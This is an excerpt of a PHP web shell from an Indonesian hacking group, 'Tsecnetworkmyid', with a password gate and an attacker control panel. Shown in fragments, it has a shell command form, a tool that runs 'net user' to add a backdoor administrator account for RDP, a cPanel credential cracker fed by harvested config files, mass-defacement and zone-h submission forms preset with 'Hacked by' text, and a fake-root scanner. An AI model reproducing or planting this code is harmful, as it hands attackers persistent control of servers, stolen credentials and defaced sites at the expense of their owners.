...
$password = "8c77e19c071d1a3193266a3008cebec5"; # md5: tsecnetwork team
...
<header>
 ...
 -------------------------------------------------------------
  ...
  |_____|\_/|_____|        .***.         |_______________|
    _|__|/ \|_|_  <a href="https://tsecnetwork.my.id" style="color: pink; text-decoration: none;">https://tsecnetwork.my.id </a>
   / ********** \                          / ********** \
 /  ************  \                      /  ************  \
--------------------                    --------------------
	</pre>
...
// Tapi Selebihnya, itu hasil kreasi Tsecnetworkmyid sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member Tsecnetworkmyid. & All My Friends.
###############################################################################
// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
###############################################################################
-->
<head>
<title>Tsecnetwork.my.id</title>
<meta name='author' content='Tsecnetworkmyid'>
<meta charset="UTF-8">
<style type='text/css'>
...
function serverinfo() {
	...
	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP "."Member Tsecnetwork Harus Anonim!";
...
function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ...
			  <input style='border: none; border-bottom: 1px solid #ff9ddbff;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ff9ddbff;' class='input' type='submit' value='>>'>
			  </form>";
	}
	...
	elseif($toolsname === "spawn") {
		...
		elseif($args === "phpinfo") {
			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
				...
				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #141414ff;}</style><div style=\'background: #141414ff; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
		}
	}
	...
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			$htaccess = "Options all\nDirectoryIndex tsecnetworkmyid.htm\nSatisfy Any";
		...
		print "<div style='background: #ff9ddbff; width: 100%; height: 100%'>";
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/tsecnetworkmyid/", exe("net user"))) die(color(1, 1, "[INFO] username 'tsecnetworkmyid' already exists."));

		$add_user   = exe("net user tsecnetworkmyid tsecnetworkmyid /add");
    	$add_groups1 = exe("net localgroup Administrators tsecnetworkmyid /add");
    	$add_groups2 = exe("net localgroup Administrator tsecnetworkmyid /add");
    	$add_groups3 = exe("net localgroup Administrateur tsecnetworkmyid /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "tsecnetworkmyid")."<br>
    	Password: ".color(1, 2, "tsecnetworkmyid")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://tsecnetworkmyid.or.id/' target='_blank'>".color(1, 2, "Tsecnetworkmyid")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Tsecnetworkmyid'><br><br>
		    	       Domains: <br>
		    	       <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
		    	       <input style='background: transparent; color: #fff6fcff; border: 1px solid #ffecf8ff; width: 460px;' type='submit' name='submit' value='Submit'>
		    	       </form></center>";
		   	}
		}
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Tsecnetworkmyid")."</p>";
			} else {
				print "<center>
				...
				print "</textarea><br>
					   ...
					   <input style='width: 425px; background: transparent; border: 1px solid #ff9ddbff; color: #ff9ddbff;' type='text' name='linkpass' placeholder='http://web.com/idx_config/'>
					   <input style='background: transparent; border: 1px solid #ff9ddbff; color: #ff9ddbff;' type='submit' name='submitlink' value='>>'>
					   <br>
				...
				print "</textarea><br>
					   <input style='background: transparent; color: #ff9ddbff; border: 1px solid #ff9ddbff; width: 460px;' type='submit' name='crack' value='Crack'>
					   </form></center>";
			}
		}
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='tsecnetworkmyid' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='tsecnetworkmyid' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ff9ddbff; border: 1px solid #ff9ddbff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center>";
			}
		}
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Tsecnetworkmyid</textarea><br>
					   <input style='background: transparent; color: #ff9ddbff; border: 1px solid #ff9ddbff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
					   </form></center>";
			}
		}
			...
			if($_POST['reverse']) {
				...
				foreach($site as $url) {
					...
					if(preg_match("/hacked/i", $cek)) {
						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=#ff9ddbff>Fake Root!</font><br>";
					}
				}
			} else {
				print "<center><form method='post'>
				...
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Tsecnetworkmyid</textarea><br>
				<input style='background: transparent; color: #ff9ddbff; border: 1px solid #ff9ddbff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
				</form><br>
